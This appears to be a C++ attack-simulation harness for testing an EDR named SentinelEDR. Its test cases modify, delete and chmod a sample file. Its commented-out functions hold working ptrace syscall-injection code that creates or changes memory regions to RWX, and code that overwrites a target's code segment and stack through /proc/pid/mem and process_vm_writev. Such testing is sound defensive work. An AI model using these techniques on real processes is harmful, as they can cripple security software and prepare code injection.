#include <iostream>
#include <fstream>
#include <filesystem>
#include <fcntl.h>
#include <unistd.h>
#include <cstdio>
#include <cstring>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/uio.h>
#include <dirent.h>

const char* target_path = "/home/ubuntu/lib/vcs-ajiant-edr/test_environment/attack_test/test_file_vcs1.txt";
const char* renamed_path = "/home/ubuntu/lib/vcs-ajiant-edr/test_environment/attack_test/test_file_renamed.txt";
const std::string SENTINEL_EDR_PATH = "/home/ubuntu/lib/vcs-ajiant-edr/build/SentinelEDR";

pid_t get_pid_by_exe_path(const std::string& target_path) {
    DIR* proc_dir = opendir("/proc");
    if (!proc_dir) {
        perror("opendir /proc failed");
        return -1;
    }

    struct dirent* entry;
    while ((entry = readdir(proc_dir)) != NULL) {
        if (entry->d_type != DT_DIR)
            continue;

        pid_t pid = atoi(entry->d_name);
        if (pid <= 0)
            continue; // Skip non-PID entries

        std::string exe_link = "/proc/" + std::to_string(pid) + "/exe";
        char exe_path[PATH_MAX] = {0};
        ssize_t len = readlink(exe_link.c_str(), exe_path, sizeof(exe_path)-1);
        if (len == -1)
            continue; // Cannot read exe (likely not accessible)
        
        exe_path[len] = '\0';
        // printf("PID: %d, EXE: %s\n", pid, exe_path);
        if (target_path == exe_path) {
            // std::cout << "this is pid: " << pid << std::endl;
            closedir(proc_dir);
            return pid; // Found the first matching PID
        }
    }

    closedir(proc_dir);
    return -1; // Not found
}

void write_file() {
    // std::ofstream ofs(target_path, std::ios::app);
    // ofs << "Appending new line.\n";
    // ofs.close();
    std::ofstream ofs;
    ofs.open(target_path, std::ios::app);
    if (!ofs) {
        std::cerr << "Error opening file for writing.\n";
        ofs.close();
        return;
    }   
    ofs << "Appending new line.\n"; 
    ofs.close();
}

void modify_file() {
    std::ofstream ofs(target_path);
    ofs << "Overwritten content.\n";
    ofs.close();
}

void delete_file() {
    std::filesystem::remove(target_path);
}

void rename_file() {
    std::filesystem::rename(target_path, renamed_path);
}

void recreate_file() {
    std::ofstream ofs(target_path, std::ios::trunc);
    ofs << "Recreated file with new content.\n";
    ofs.close();
}

void chmod_file() {
    std::cout << "Result chmod: " << chmod(target_path, 0000) << "\n"; // danger
}

void mmap_write() {
    int fd = open(target_path, O_RDWR);
    if (fd < 0) {
        perror("open");
        return;
    }

    size_t length = 4096;
    char* data = (char*) mmap(NULL, length, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (data == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return;
    }

    sprintf(data, "Modified via mmap!\n");
    msync(data, length, MS_SYNC);
    munmap(data, length);
    close(fd);
}

void open_write_only() {
    int fd = open(target_path, O_WRONLY);
    if (fd >= 0) {
        write(fd, "Direct write\n", 13);
        close(fd);
    }
}

// void create_symlink() {
//     const char* symlink_path = "/tmp/test_symlink";
//     unlink(symlink_path);
//     symlink(target_path, symlink_path);
// }

// void create_hardlink() {
//     const char* hardlink_path = "/tmp/test_hardlink";
//     unlink(hardlink_path);
//     link(target_path, hardlink_path);
// }


// Hàm mô phỏng việc cấp phát vùng nhớ ẩn danh với quyền RWX (Read, Write, Execute).
// Kẻ tấn công có thể dùng để tạo nơi chứa shellcode.
void remote_mmap_rwx_exploit() {
    pid_t pid = get_pid_by_exe_path(SENTINEL_EDR_PATH);
    if (pid == -1) {
        std::cerr << "Target process not found.\n";
        return;
    }

    std::cout << "[+] Found target PID: " << pid << "\n";

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach failed");
        return;
    }

    waitpid(pid, NULL, 0);
    std::cout << "[+] Attached to PID: " << pid << "\n";

    // Đợi tiến trình đứng tại syscall-entry point
    while (true) {
        if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) {
            perror("ptrace syscall wait failed");
            goto detach;
        }
        waitpid(pid, NULL, 0);

        struct user_regs_struct regs;
        if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
            perror("ptrace getregs failed");
            goto detach;
        }

        if (regs.orig_rax != -1) {
            // Đang đứng tại syscall-entry point
            std::cout << "[+] Stopped at syscall-entry (orig_rax = " << regs.orig_rax << ")\n";
            // Lưu context gốc
            struct user_regs_struct saved_regs = regs;

            // Ghi đè syscall mmap vào tiến trình đích
            regs.rax = 9;  // Syscall number for mmap
            regs.rdi = 0;  // addr (NULL)
            regs.rsi = 4096;  // length
            regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;  // prot
            regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;  // flags
            regs.r8 = -1;  // fd
            regs.r9 = 0;   // offset

            if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
                perror("ptrace setregs failed");
                goto detach;
            }

            // Bước vào syscall (entry → exit)
            if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) {
                perror("ptrace syscall step in failed");
                goto detach;
            }
            waitpid(pid, NULL, 0);

            // Bước ra syscall
            if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) {
                perror("ptrace syscall step out failed");
                goto detach;
            }
            waitpid(pid, NULL, 0);

            // Lấy kết quả trả về từ syscall (addr mmap RWX)
            if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
                perror("ptrace getregs after syscall failed");
                goto detach;
            }

            std::cout << "[+] mmap RWX returned address: " << std::hex << (void*)regs.rax << "\n";

            // Restore lại context ban đầu
            if (ptrace(PTRACE_SETREGS, pid, NULL, &saved_regs) == -1) {
                perror("ptrace restore registers failed");
                goto detach;
            }

            break;
        }
    }

detach:
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    std::cout << "[+] Detached from PID: " << pid << "\n";
}

// Hàm mô phỏng việc thay đổi quyền của một vùng nhớ đã tồn tại thành RWX.
// Kẻ tấn công có thể dùng để biến vùng dữ liệu thành vùng thực thi.

void remote_mprotect_rwx_exploit() {
    auto find_rw_memory_region = [] (pid_t pid, size_t& region_size) -> uintptr_t {
        std::string maps_path = "/proc/" + std::to_string(pid) + "/maps";
        std::ifstream maps_file(maps_path);
        if (!maps_file.is_open()) {
            perror("open maps failed");
            return 0;
        }

        std::string line;
        while (std::getline(maps_file, line)) {
            if (line.find("rw-p") != std::string::npos) {
                std::stringstream ss(line);
                std::string addr_range;
                ss >> addr_range;
                size_t dash_pos = addr_range.find('-');
                if (dash_pos == std::string::npos)
                    continue;

                std::string start_str = addr_range.substr(0, dash_pos);
                std::string end_str = addr_range.substr(dash_pos + 1);
                uintptr_t start_addr = std::stoull(start_str, nullptr, 16);
                uintptr_t end_addr = std::stoull(end_str, nullptr, 16);

                region_size = end_addr - start_addr;
                return start_addr;
            }
        }

        return 0; // Not found
    };
    pid_t pid = get_pid_by_exe_path(SENTINEL_EDR_PATH);
    if (pid == -1) {
        std::cerr << "Target process not found.\n";
        return;
    }

    std::cout << "[+] Found target PID: " << pid << "\n";

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach failed");
        return;
    }

    waitpid(pid, NULL, 0);
    std::cout << "[+] Attached to PID: " << pid << "\n";

    size_t region_size;
    uintptr_t rw_region = find_rw_memory_region(pid, region_size);
    if (rw_region == 0) {
        std::cerr << "Failed to find RW memory region.\n";
        goto detach;
    }

    std::cout << "[+] Found RW memory region at: 0x" << std::hex << rw_region 
              << " (size: " << std::dec << region_size << " bytes)\n";

    // Đợi tiến trình dừng tại syscall-entry point
    while (true) {
        if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) {
            perror("ptrace syscall wait failed");
            goto detach;
        }
        waitpid(pid, NULL, 0);

        struct user_regs_struct regs;
        if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
            perror("ptrace getregs failed");
            goto detach;
        }

        if (regs.orig_rax != -1) {
            std::cout << "[+] Stopped at syscall-entry (orig_rax = " << regs.orig_rax << ")\n";
            struct user_regs_struct saved_regs = regs;

            // Prepare mprotect syscall injection
            regs.rax = 10; // syscall number for mprotect
            regs.rdi = rw_region; // addr
            regs.rsi = region_size; // length
            regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC; // prot

            if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
                perror("ptrace setregs failed");
                goto detach;
            }

            // Step into syscall
            if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) {
                perror("ptrace syscall step in failed");
                goto detach;
            }
            waitpid(pid, NULL, 0);

            // Step out syscall
            if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) {
                perror("ptrace syscall step out failed");
                goto detach;
            }
            waitpid(pid, NULL, 0);

            // Get return value
            if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
                perror("ptrace getregs after syscall failed");
                goto detach;
            }

            if ((long)regs.rax < 0) {
                std::cerr << "[-] mprotect failed with error: " << (long)regs.rax << "\n";
            } else {
                std::cout << "[+] mprotect RWX succeeded at: 0x" << std::hex << rw_region << "\n";
            }

            // Restore registers
            if (ptrace(PTRACE_SETREGS, pid, NULL, &saved_regs) == -1) {
                perror("ptrace restore registers failed");
                goto detach;
            }

            break;
        }
    }

detach:
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    std::cout << "[+] Detached from PID: " << pid << "\n";
}

void overwrite_code_segment() {
    pid_t pid = get_pid_by_exe_path(SENTINEL_EDR_PATH);
    pid = 15979;
    char mem_path[256], maps_path[256], line[512];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

    FILE *maps = fopen(maps_path, "r");
    if (!maps) {
        perror("fopen maps");
        return;
    }

    unsigned long code_addr = 0;
    while (fgets(line, sizeof(line), maps)) {
        if (strstr(line, "r-xp")) {  // Code segment
            sscanf(line, "%lx-", &code_addr);
            break;
        }
    }
    fclose(maps);

    if (code_addr == 0) {
        printf("No executable code segment found!\n");
        return;
    }

    int mem_fd = open(mem_path, O_RDWR);
    if (mem_fd == -1) {
        perror("open mem");
        return;
    }

    if (lseek(mem_fd, code_addr, SEEK_SET) == -1) {
        perror("lseek");
        close(mem_fd);
        return;
    }

    char crash_bytes[] = "\xCC\xCC\xCC\xCC";  // INT3 (breakpoint)
    if (write(mem_fd, crash_bytes, sizeof(crash_bytes)) != sizeof(crash_bytes)) {
        perror("write");
    } else {
        printf("Overwritten code segment at 0x%lx -> process should crash soon!\n", code_addr);
    }

    close(mem_fd);
}

void overwrite_stack() {
    pid_t pid = 1;//get_pid_by_exe_path(SENTINEL_EDR_PATH);
    pid = 15979;
    char dummy[] = "CRASH";
    struct iovec local[1];
    struct iovec remote[1];

    local[0].iov_base = dummy;
    local[0].iov_len = sizeof(dummy);

    // Fake stack address (có thể tìm offset stack từ /proc/[pid]/maps)
    void *target_stack_addr = (void *)0x7fffffffe000; 

    remote[0].iov_base = target_stack_addr;
    remote[0].iov_len = sizeof(dummy);

    ssize_t nwrite = process_vm_writev(pid, local, 1, remote, 1, 0);
    if (nwrite == -1) {
        perror("process_vm_writev");
    } else {
        printf("Wrote %ld bytes to process %d stack\n", nwrite, pid);
    }
}
void mprotect_rwx_and_inject() {
    pid_t pid = get_pid_by_exe_path(SENTINEL_EDR_PATH);
    pid = 15979;
    char mem_path[256], maps_path[256], line[512];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

    FILE *maps = fopen(maps_path, "r");
    if (!maps) {
        perror("fopen maps");
        return;
    }

    unsigned long addr = 0;
    while (fgets(line, sizeof(line), maps)) {
        if (strstr(line, "r-xp")) {  // Code segment
            sscanf(line, "%lx-", &addr);
            break;
        }
    }
    fclose(maps);

    if (addr == 0) {
        printf("No executable region found!\n");
        return;
    }

    // Attach ptrace để kernel cho phép ghi mem
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach");
        return;
    }
    waitpid(pid, NULL, 0);

    int mem_fd = open(mem_path, O_RDWR);
    if (mem_fd == -1) {
        perror("open mem");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return;
    }

    if (lseek(mem_fd, addr, SEEK_SET) == -1) {
        perror("lseek");
        close(mem_fd);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return;
    }

    char payload[] = "\xCC\xCC\xCC\xCC";  // INT3 x4
    if (write(mem_fd, payload, sizeof(payload)) != sizeof(payload)) {
        perror("write mem");
    } else {
        printf("Overwritten code at 0x%lx, target should crash.\n", addr);
    }

    close(mem_fd);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
}
int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: ./test_attack <test_case>\n";
        return 1;
    }
    // std::cout << "target pid: " << get_pid_by_exe_path(SENTINEL_EDR_PATH) << std::endl;
    std::string arg = argv[1];

    if (arg == "1" || arg == "write") write_file();
    else if (arg == "2" || arg == "modify") modify_file();
    else if (arg == "3" || arg == "delete") delete_file();
    else if (arg == "4" || arg == "rename") rename_file();
    else if (arg == "5" || arg == "recreate") recreate_file();
    else if (arg == "6" || arg == "chmod") chmod_file();
    else if (arg == "7" || arg == "mmap") mmap_write();
    else if (arg == "8" || arg == "openwrite") open_write_only();
    // else if (arg == "9" || arg == "symlink") create_symlink();
    // else if (arg == "10" || arg == "hardlink") create_hardlink();
    // else if (arg == "11" || arg == "anonmmap") remote_mmap_rwx_exploit();
    // else if (arg == "12" || arg == "mprotect") remote_mprotect_rwx_exploit();
    // else if (arg == "13" || arg == "omem") overwrite_code_segment();
    // else if (arg == "14" || arg == "ostack") overwrite_stack();
    // else if (arg == "15" || arg == "test") 
    // {
    //     mprotect_rwx_and_inject();
    // }
    else {
        std::cerr << "Unknown test case: " << arg << "\n";
        return 1;
    }

    std::cout << "Test case [" << arg << "] executed.\n";
    return 0;
}
